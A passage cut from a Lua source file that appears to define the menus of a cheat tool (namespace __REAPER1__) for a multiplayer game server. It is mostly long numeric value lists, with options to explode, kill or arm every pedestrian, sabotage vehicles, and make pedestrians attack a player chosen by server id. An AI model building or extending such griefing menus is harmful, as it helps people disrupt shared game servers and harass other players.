-1576, -1575, -1574, -1573, -1572, -1571, -1570, -1569, -1568, -1567, -1566, -1565, -1564, -1563, -1562, -1561, -1560, -1559, -1558, -1557, -1556, -1555, -1554, -1553, -1552, -1551, -1550, -1549, -1548, -1547, -1546, -1545, -1544, -1543, -1542, -1541, -1540, -1539, -1538, -1537, -1536, -1535, -1534, -1533, -1532, -1531, -1530, -1529, -1528, -1527, -1526, -1525, -1524, -1523, -1522, -1521, -1520, -1519, -1518, -1517, -1516, -1515, -1514, -1513, -1512, -1511, -1510, -1509, -1508, -1507, -1506, -1505, -1504, -1503, -1502, -1501, -1500, -1499, -1498, -1497, -1496, -1495, -1494, -1493, -1492, -1491, -1490, -1489, -1488, -1487, -1486, -1485, -1484, -1483, -1482, -1481, -1480, -1479, -1478, -1477, -1476, -1475, -1474, -1473, -1472, -1471, -1470, -1469, -1468, -1467, -1466, -1465, -1464, -1463, -1462, -1461, -1460, -1459, -1458, -1457, -1456, -1455, -1454, -1453, -1452, -1451, -1450, -1449, -1448, -1447, -1446, -1445, -1444, -1443, -1442, -1441, -1440, -1439, -1438, -1437, -1436, -1435, -1434, -1433, -1432, -1431, -1430, -1429, -1428, -1427, -1426, -1425, -1424, -1423, -1422, -1421, -1420, -1419, -1418, -1417, -1416, -1415, -1414, -1413, -1412, -1411, -1410, -1409, -1408, -1407, -1406, -1405, -1404, -1403, -1402, -1401, -1400, -1399, -1398, -1397, -1396, -1395, -1394, -1393, -1392, -1391, -1390, -1389, -1388, -1387, -1386, -1385, -1384, -1383, -1382, -1381, -1380, -1379, -1378, -1377, -1376, -1375, -1374, -1373, -1372, -1371, -1370, -1369, -1368, -1367, -1366, -1365, -1364, -1363, -1362, -1361, -1360, -1359, -1358, -1357, -1356, -1355, -1354, -1353, -1352, -1351, -1350, -1349, -1348, -1347, -1346, -1345, -1344, -1343, -1342, -1341, -1340, -1339, -1338, -1337, -1336, -1335, -1334, -1333, -1332, -1331, -1330, -1329, -1328, -1327, -1326, -1325, -1324, -1323, -1322, -1321, -1320, -1319, -1318, -1317, -1316, -1315, -1314, -1313, -1312, -1311, -1310, -1309, -1308, -1307, -1306, -1305, -1304, -1303, -1302, -1301, -1300, -1299, -1298, -1297, -1296, -1295, -1294, -1293, -1292, -1291, -1290, -1289, -1288, -1287, -1286, -1285, -1284, -1283, -1282, -1281, -1280, -1279, -1278, -1277, -1276, -1275, -1274, -1273, -1272, -1271, -1270, -1269, -1268, -1267, -1266, -1265, -1264, -1263, -1262, -1261, -1260, -1259, -1258, -1257, -1256, -1255, -1254, -1253, -1252, -1251, -1250, -1249, -1248, -1247, -1246, -1245, -1244, -1243, -1242, -1241, -1240, -1239, -1238, -1237, -1236, -1235, -1234, -1233, -1232, -1231, -1230, -1229, -1228, -1227, -1226, -1225, -1224, -1223, -1222, -1221, -1220, -1219, -1218, -1217, -1216, -1215, -1214, -1213, -1212, -1211, -1210, -1209, -1208, -1207, -1206, -1205, -1204, -1203, -1202, -1201, -1200, -1199, -1198, -1197, -1196, -1195, -1194, -1193, -1192, -1191, -1190, -1189, -1188, -1187, -1186, -1185, -1184, -1183, -1182, -1181, -1180, -1179, -1178, -1177, -1176, -1175, -1174, -1173, -1172, -1171, -1170, -1169, -1168, -1167, -1166, -1165, -1164, -1163, -1162, -1161, -1160, -1159, -1158, -1157, -1156, -1155, -1154, -1153, -1152, -1151, -1150, -1149, -1148, -1147, -1146, -1145, -1144, -1143, -1142, -1141, -1140, -1139, -1138, -1137, -1136, -1135, -1134, -1133, -1132, -1131, -1130, -1129, -1128, -1127, -1126, -1125, -1124, -1123, -1122, -1121, -1120, -1119, -1118, -1117, -1116, -1115, -1114, -1113, -1112, -1111, -1110, -1109, -1108, -1107, -1106, -1105, -1104, -1103, -1102, -1101, -1100, -1099, -1098, -1097, -1096, -1095, -1094, -1093, -1092, -1091, -1090, -1089, -1088, -1087, -1086, -1085, -1084, -1083, -1082, -1081, -1080, -1079, -1078, -1077, -1076, -1075, -1074, -1073, -1072, -1071, -1070, -1069, -1068, -1067, -1066, -1065, -1064, -1063, -1062, -1061, -1060, -1059, -1058, -1057, -1056, -1055, -1054, -1053, -1052, -1051, -1050, -1049, -1048, -1047, -1046, -1045, -1044, -1043, -1042, -1041, -1040, -1039, -1038, -1037, -1036, -1035, -1034, -1033, -1032, -1031, -1030, -1029, -1028, -1027, -1026, -1025, -1024, -1023, -1022, -1021, -1020, -1019, -1018, -1017, -1016, -1015, -1014, -1013, -1012, -1011, -1010, -1009, -1008, -1007, -1006, -1005, -1004, -1003, -1002, -1001, -1000, -999, -998, -997, -996, -995, -994, -993, -992, -991, -990, -989, -988, -987, -986, -985, -984, -983, -982, -981, -980, -979, -978, -977, -976, -975, -974, -973, -972, -971, -970, -969, -968, -967, -966, -965, -964, -963, -962, -961, -960, -959, -958, -957, -956, -955, -954, -953, -952, -951, -950, -949, -948, -947, -946, -945, -944, -943, -942, -941, -940, -939, -938, -937, -936, -935, -934, -933, -932, -931, -930, -929, -928, -927, -926, -925, -924, -923, -922, -921, -920, -919, -918, -917, -916, -915, -914, -913, -912, -911, -910, -909, -908, -907, -906, -905, -904, -903, -902, -901, -900, -899, -898, -897, -896, -895, -894, -893, -892, -891, -890, -889, -888, -887, -886, -885, -884, -883, -882, -881, -880, -879, -878, -877, -876, -875, -874, -873, -872, -871, -870, -869, -868, -867, -866, -865, -864, -863, -862, -861, -860, -859, -858, -857, -856, -855, -854, -853, -852, -851, -850, -849, -848, -847, -846, -845, -844, -843, -842, -841, -840, -839, -838, -837, -836, -835, -834, -833, -832, -831, -830, -829, -828, -827, -826, -825, -824, -823, -822, -821, -820, -819, -818, -817, -816, -815, -814, -813, -812, -811, -810, -809, -808, -807, -806, -805, -804, -803, -802, -801, -800, -799, -798, -797, -796, -795, -794, -793, -792, -791, -790, -789, -788, -787, -786, -785, -784, -783, -782, -781, -780, -779, -778, -777, -776, -775, -774, -773, -772, -771, -770, -769, -768, -767, -766, -765, -764, -763, -762, -761, -760, -759, -758, -757, -756, -755, -754, -753, -752, -751, -750, -749, -748, -747, -746, -745, -744, -743, -742, -741, -740, -739, -738, -737, -736, -735, -734, -733, -732, -731, -730, -729, -728, -727, -726, -725, -724, -723, -722, -721, -720, -719, -718, -717, -716, -715, -714, -713, -712, -711, -710, -709, -708, -707, -706, -705, -704, -703, -702, -701, -700, -699, -698, -697, -696, -695, -694, -693, -692, -691, -690, -689, -688, -687, -686, -685, -684, -683, -682, -681, -680, -679, -678, -677, -676, -675, -674, -673, -672, -671, -670, -669, -668, -667, -666, -665, -664, -663, -662, -661, -660, -659, -658, -657, -656, -655, -654, -653, -652, -651, -650, -649, -648, -647, -646, -645, -644, -643, -642, -641, -640, -639, -638, -637, -636, -635, -634, -633, -632, -631, -630, -629, -628, -627, -626, -625, -624, -623, -622, -621, -620, -619, -618, -617, -616, -615, -614, -613, -612, -611, -610, -609, -608, -607, -606, -605, -604, -603, -602, -601, -600, -599, -598, -597, -596, -595, -594, -593, -592, -591, -590, -589, -588, -587, -586, -585, -584, -583, -582, -581, -580, -579, -578, -577, -576, -575, -574, -573, -572, -571, -570, -569, -568, -567, -566, -565, -564, -563, -562, -561, -560, -559, -558, -557, -556, -555, -554, -553, -552, -551, -550, -549, -548, -547, -546, -545, -544, -543, -542, -541, -540, -539, -538, -537, -536, -535, -534, -533, -532, -531, -530, -529, -528, -527, -526, -525, -524, -523, -522, -521, -520, -519, -518, -517, -516, -515, -514, -513, -512, -511, -510, -509, -508, -507, -506, -505, -504, -503, -502, -501, -500, -499, -498, -497, -496, -495, -494, -493, -492, -491, -490, -489, -488, -487, -486, -485, -484, -483, -482, -481, -480, -479, -478, -477, -476, -475, -474, -473, -472, -471, -470, -469, -468, -467, -466, -465, -464, -463, -462, -461, -460, -459, -458, -457, -456, -455, -454, -453, -452, -451, -450, -449, -448, -447, -446, -445, -444, -443, -442, -441, -440, -439, -438, -437, -436, -435, -434, -433, -432, -431, -430, -429, -428, -427, -426, -425, -424, -423, -422, -421, -420, -419, -418, -417, -416, -415, -414, -413, -412, -411, -410, -409, -408, -407, -406, -405, -404, -403, -402, -401, -400, -399, -398, -397, -396, -395, -394, -393, -392, -391, -390, -389, -388, -387, -386, -385, -384, -383, -382, -381, -380, -379, -378, -377, -376, -375, -374, -373, -372, -371, -370, -369, -368, -367, -366, -365, -364, -363, -362, -361, -360, -359, -358, -357, -356, -355, -354, -353, -352, -351, -350, -349, -348, -347, -346, -345, -344, -343, -342, -341, -340, -339, -338, -337, -336, -335, -334, -333, -332, -331, -330, -329, -328, -327, -326, -325, -324, -323, -322, -321, -320, -319, -318, -317, -316, -315, -314, -313, -312, -311, -310, -309, -308, -307, -306, -305, -304, -303, -302, -301, -300, -299, -298, -297, -296, -295, -294, -293, -292, -291, -290, -289, -288, -287, -286, -285, -284, -283, -282, -281, -280, -279, -278, -277, -276, -275, -274, -273, -272, -271, -270, -269, -268, -267, -266, -265, -264, -263, -262, -261, -260, -259, -258, -257, -256, -255, -254, -253, -252, -251, -250, -249, -248, -247, -246, -245, -244, -243, -242, -241, -240, -239, -238, -237, -236, -235, -234, -233, -232, -231, -230, -229, -228, -227, -226, -225, -224, -223, -222, -221, -220, -219, -218, -217, -216, -215, -214, -213, -212, -211, -210, -209, -208, -207, -206, -205, -204, -203, -202, -201, -200, -199, -198, -197, -196, -195, -194, -193, -192, -191, -190, -189, -188, -187, -186, -185, -184, -183, -182, -181, -180, -179, -178, -177, -176, -175, -174, -173, -172, -171, -170, -169, -168, -167, -166, -165, -164, -163, -162, -161, -160, -159, -158, -157, -156, -155, -154, -153, -152, -151, -150, -149, -148, -147, -146, -145, -144, -143, -142, -141, -140, -139, -138, -137, -136, -135, -134, -133, -132, -131, -130, -129, -128, -127, -126, -125, -124, -123, -122, -121, -120, -119, -118, -117, -116, -115, -114, -113, -112, -111, -110, -109, -108, -107, -106, -105, -104, -103, -102, -101, -100, -99, -98, -97, -96, -95, -94, -93, -92, -91, -90, -89, -88, -87, -86, -85, -84, -83, -82, -81, -80, -79, -78, -77, -76, -75, -74, -73, -72, -71, -70, -69, -68, -67, -66, -65, -64, -63, -62, -61, -60, -59, -58, -57, -56, -55, -54, -53, -52, -51, -50, -49, -48, -47, -46, -45, -44, -43, -42, -41, -40, -39, -38, -37, -36, -35, -34, -33, -32, -31, -30, -29, -28, -27, -26, -25, -24, -23, -22, -21, -20, -19, -18, -17, -16, -15, -14, -13, -12, -11, -10, -9, -8, -7, -6, -5, -4, -3, -2, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000}},
            {text = 'Body health', dkey = 'world:hover:veh_bhealt', desc = 'Set the body health for the hovered\nvehicle.', afu = __REAPER1__.M.world.hover.veh.bodyhealth, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Body health number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Fuck up', dkey = 'world:hover:veh_fuckup', desc = 'Fuck up the hovered vehicle.', afu = __REAPER1__.M.world.hover.veh.fuckup, option = __REAPER1__.M.Button},
            {text = 'Randomize look', dkey = 'world:hover:veh_randomizelook', desc = 'Randomize the look of the hovered\nvehicle.', afu = __REAPER1__.M.world.hover.veh.randomize, option = __REAPER1__.M.Button},
            {text = 'Tune', dkey = 'world:hover:veh_tune', desc = 'Tune the hovered vehicle.', afu = __REAPER1__.M.world.hover.veh.tune, option = __REAPER1__.M.Button},
            {text = 'Downgrade', dkey = 'world:hover:veh_downgrade', desc = 'Remove the customs and tuning from\nthe hovered vehicle.', afu = __REAPER1__.M.world.hover.veh.downgrade, option = __REAPER1__.M.Button},
            {text = 'Fix', dkey = 'world:hover:veh_fix', desc = 'Fix the hovered vehicle.', afu = __REAPER1__.M.world.hover.veh.fix, option = __REAPER1__.M.Button},
            {text = 'Cruise (km/h)', dkey = 'world:hover:veh_maxspeed', desc = 'Set the max speed of the hovered vehicle.', afu = __REAPER1__.M.world.hover.veh.maxspeed, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Maximum speed number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set speed (km/h)', dkey = 'world:hover:veh_setspeed', desc = 'Set the speed of the hovered vehicle.', afu = __REAPER1__.M.world.hover.veh.speed, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Speed number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Fuel', dkey = 'world:hover:veh_fuel', desc = 'Set the fuel for the hovered vehicle.', afu = __REAPER1__.M.world.hover.veh.fuel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle fuel number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Remove wheels', dkey = 'world:hover:veh_removewheels', desc = 'Remove the wheels of the hovered\nvehicle.', afu = __REAPER1__.M.world.hover.veh.removewheels, option = __REAPER1__.M.Button},
            {text = 'Toggle lock', dkey = 'world:hover:veh_togglelock', desc = 'Toggle the lock of the hovered vehicle.', afu = __REAPER1__.M.world.hover.veh.lock, option = __REAPER1__.M.Button},
        },

        ['world:hover:obj'] = {
            {text = 'Active', dkey = 'world:hover:obj_active', desc = 'If active when you hover to a new entity,\nthe menu will change to that.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Object', option = __REAPER1__.M.Separator},
            {text = 'Delete', dkey = 'world:hover:obj_delete', desc = 'Delete the hovered object.', afu = __REAPER1__.M.world.hover.delete, option = __REAPER1__.M.Button},
            {text = 'Heading', dkey = 'world:hover:obj_heading', desc = 'Set the hovered object\'s heading.', afu = __REAPER1__.M.world.hover.heading, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Heading number', length = 3, tipus = 'szam', func = {}},
            {text = 'Coords', dkey = 'world:hover:obj_coords', desc = 'Set the hovered object\'s position.', afu = __REAPER1__.M.world.hover.coords, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Object coords', length = 30, tipus = 'vegyes', func = 'None'},
            {text = 'Invisible', dkey = 'world:hover:obj_invisible', desc = 'Make the hovered object invisible.', afu = __REAPER1__.M.world.hover.invisible, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'God moded', dkey = 'world:hover:obj_godmoded', desc = 'Make the hovered object god moded.', afu = __REAPER1__.M.world.hover.godded, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Freeze', dkey = 'world:hover:obj_freeze', desc = 'Freeze the hovered object.', afu = __REAPER1__.M.world.hover.freeze, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'No collision', dkey = 'world:hover:obj_nocollision', desc = 'Disable the hovered object\'s collision.', afu = __REAPER1__.M.world.hover.nocollision, option = __REAPER1__.M.Checkbox, func = false},
        },

        ['world:peds'] = {
            {text = 'Delete', dkey = 'world:peds_delete', desc = 'Delete every pedestrian.', afu = __REAPER1__.M.world.peds.delete, option = __REAPER1__.M.Button},
            {text = 'Bring', dkey = 'world:peds_bring', desc = 'Bring every pedestrian.', afu = __REAPER1__.M.world.peds.bring, option = __REAPER1__.M.Button},
            {text = 'Heading', dkey = 'world:peds_heading', desc = 'Set the heading of the pedestrians.', afu = __REAPER1__.M.world.peds.heading, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Heading number', length = 3, tipus = 'szam', func = {}},
            {text = 'Coords', dkey = 'world:peds_coords', desc = 'Set the coords of the pedestrians.', afu = __REAPER1__.M.world.peds.coords, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Pedestrian coords', length = 30, tipus = 'vegyes', func = 'None'},
            {text = 'Invisible', dkey = 'world:peds_invisible', desc = 'Make every pedestrian invisible.', afu = __REAPER1__.M.world.peds.invisible, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'God moded', dkey = 'world:peds_godded', desc = 'Make every pedestrian godded.', afu = __REAPER1__.M.world.peds.godded, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Freeze', dkey = 'world:peds_freeze', desc = 'Make every pedestrian frozen.', afu = __REAPER1__.M.world.peds.freeze, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Explode', dkey = 'world:peds_explode', desc = 'Explode every pedestrian.', afu = __REAPER1__.M.world.peds.explode, option = __REAPER1__.M.Button},
            {text = 'Push', dkey = 'world:peds_push', desc = 'Push every pedestrian.', afu = __REAPER1__.M.world.peds.push, option = __REAPER1__.M.Button},
            {text = 'No collision', dkey = 'world:peds_nocollision', desc = 'Disable every peds\' collision.', afu = __REAPER1__.M.world.peds.nocollision, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Specific', option = __REAPER1__.M.Separator},
            {text = 'Kill', dkey = 'world:peds_kill', desc = 'Kill every pedestrian.', afu = __REAPER1__.M.world.peds.kill, option = __REAPER1__.M.Button},
            {text = 'Weapon', dkey = 'world:peds_weapon', desc = 'Give or remove a chosen weapon from\nthe pedestrians.', afu = __REAPER1__.M.world.peds.weapon, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Weapon name', length = 20, tipus = 'betu', func = __REAPER1__.T.Weapons},
            {text = 'Condition', dkey = 'world:peds_condition', desc = 'Set a condition for the pedestrians.', afu = __REAPER1__.M.world.peds.condition, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Condition name', length = 20, tipus = 'betu', func = {'Angry', 'Deaf', 'Blind', 'Deaf & Blind'}},
            {text = 'Animation', dkey = 'world:peds_animation', desc = 'Force an animation for the pedestrians.', afu = __REAPER1__.M.world.peds.animation, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Animation name', length = 20, tipus = 'betu', func = {'Sex', 'Sex 2', 'Twerking', 'Thinking', 'Pointing', 'Clapping', 'Whistle', 'Dead', 'Sleeping', 'Jerking off', 'Lap dance', 'Lean', 'Kiss', 'Hug'}},
            {text = 'Stop animation', dkey = 'world:peds_stopanimation', desc = 'Stop the animations for the pedestrians.', afu = __REAPER1__.M.world.peds.stopanim, option = __REAPER1__.M.Button},
            {text = 'Mind clear', dkey = 'world:peds_mindclear', desc = 'Force stop whatever the pedestrians\naround you are doing.', afu = __REAPER1__.M.world.peds.mindclear, option = __REAPER1__.M.Button},
            {text = 'Attack player', dkey = 'world:peds_attackplayer', desc = 'Force the pedestrians around you to\nattack a player with the given server id.', afu = __REAPER1__.M.world.peds.attack, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Player id number', length = 5, tipus = 'szam', func = 0},
            {text = 'Ragdoll', dkey = 'world:peds_ragdoll', desc = 'Ragdoll the pedestrians.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Randomize clothing', dkey = 'world:peds_randomizeclothing', desc = 'Randomize the clothhing of every\npedestrian.', afu = __REAPER1__.M.world.peds.clothing, option = __REAPER1__.M.Button},
            {text = 'Particle', dkey = 'world:peds_particle', desc = 'Play a particle on every pedestrian.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Particle name', length = 50, tipus = 'vegyes', toggle = false, func = __REAPER1__.T.MParticles},
            {text = 'Put in vehicle', dkey = 'world:peds_putinveh', desc = 'Put every pedestrian around you in a\nspawned vehicle.', afu = __REAPER1__.M.world.peds.putinveh, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Vehicle name', length = 30, tipus = 'vegyes', func = 'None'},
            {text = 'Turn into', dkey = 'world:peds_turninto', desc = 'Turn every ped around you into a\nchosen thing.', afu = __REAPER1__.M.world.peds.turninto, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Transformation name', length = 20, tipus = 'betu', func = {'Building', 'Plane', 'Wheel', 'Ufo', 'Blimp'}, extra = {-1404869155, `cargoplane`, `p_ferris_wheel_amo_p`, `p_spinning_anus_s`, `blimp`}},
        },

        ['world:vehicles'] = {
            {text = 'Delete', dkey = 'world:vehicles_delete', desc = 'Delete every vehicle.', afu = __REAPER1__.M.world.vehicles.delete, option = __REAPER1__.M.Button},
            {text = 'Bring', dkey = 'world:vehicles_bring', desc = 'Bring every vehicle.', afu = __REAPER1__.M.world.vehicles.bring, option = __REAPER1__.M.Button},
            {text = 'Heading', dkey = 'world:vehicles_heading', desc = 'Set the heading of the vehicles around\nyou.', afu = __REAPER1__.M.world.vehicles.heading, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Heading number', length = 3, tipus = 'szam', func = {}},
            {text = 'Coords', dkey = 'world:vehicles_coords', desc = 'Set the coords of the vehicles around\nyou.', afu = __REAPER1__.M.world.vehicles.coords, option = __REAPER1__.M.Button_Textbox, textboxtext = 'vehicle coords', length = 30, tipus = 'vegyes', func = 'None'},
            {text = 'Invisible', dkey = 'world:vehicles_invisible', desc = 'Make every vehicle invisible around\nyou.', afu = __REAPER1__.M.world.vehicles.invisible, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'God moded', dkey = 'world:vehicles_godded', desc = 'Make every vehicle godded around\nyou.', afu = __REAPER1__.M.world.vehicles.godded, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Freeze', dkey = 'world:vehicles_freeze', desc = 'Make every vehicle frozen.', afu = __REAPER1__.M.world.vehicles.freeze, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Explode', dkey = 'world:vehicles_explode', desc = 'Explode every vehicle.', afu = __REAPER1__.M.world.vehicles.explode, option = __REAPER1__.M.Button},
            {text = 'Push', dkey = 'world:vehicles_push', desc = 'Push every vehicle.', afu = __REAPER1__.M.world.vehicles.push, option = __REAPER1__.M.Button},
            {text = 'No collision', dkey = 'world:vehicles_nocollision', desc = 'Disable every vehicles\' collision.', afu = __REAPER1__.M.world.vehicles.nocollision, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Specific', option = __REAPER1__.M.Separator},
            {text = 'Engine health', dkey = 'world:vehicles_ehealth', desc = 'Set the engine health for the vehicles.', afu = __REAPER1__.M.world.vehicles.enginehealth, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Engine health number', length = 4, tipus = 'szam', func = {-4000, -3999, -3998, -3997, -3996, -3995, -3994, -3993, -3992, -3991, -3990, -3989, -3988, -3987, -3986, -3985, -3984, -3983, -3982, -3981, -3980, -3979, -3978, -3977, -3976, -3975, -3974, -3973, -3972, -3971, -3970, -3969, -3968, -3967, -3966, -3965, -3964, -3963, -3962, -3961, -3960, -3959, -3958, -3957, -3956, -3955, -3954, -3953, -3952, -3951, -3950, -3949, -3948, -3947, -3946, -3945, -3944, -3943, -3942, -3941, -3940, -3939, -3938, -3937, -3936, -3935, -3934, -3933, -3932, -3931, -3930, -3929, -3928, -3927, -3926, -3925, -3924, -3923, -3922, -3921, -3920, -3919, -3918, -3917, -3916, -3915, -3914, -3913, -3912, -3911, -3910, -3909, -3908, -3907, -3906, -3905, -3904, -3903, -3902, -3901, -3900, -3899, -3898, -3897, -3896, -3895, -3894, -3893, -3892, -3891, -3890, -3889, -3888, -3887, -3886, -3885, -3884, -3883, -3882, -3881, -3880, -3879, -3878, -3877, -3876, -3875, -3874, -3873, -3872, -3871, -3870, -3869, -3868, -3867, -3866, -3865, -3864, -3863, -3862, -3861, -3860, -3859, -3858, -3857, -3856, -3855, -3854, -3853, -3852, -3851, -3850, -3849, -3848, -3847, -3846, -3845, -3844, -3843, -3842, -3841, -3840, -3839, -3838, -3837, -3836, -3835, -3834, -3833, -3832, -3831, -3830, -3829, -3828, -3827, -3826, -3825, -3824, -3823, -3822, -3821, -3820, -3819, -3818, -3817, -3816, -3815, -3814, -3813, -3812, -3811, -3810, -3809, -3808, -3807, -3806, -3805, -3804, -3803, -3802, -3801, -3800, -3799, -3798, -3797, -3796, -3795, -3794, -3793, -3792, -3791, -3790, -3789, -3788, -3787, -3786, -3785, -3784, -3783, -3782, -3781, -3780, -3779, -3778, -3777, -3776, -3775, 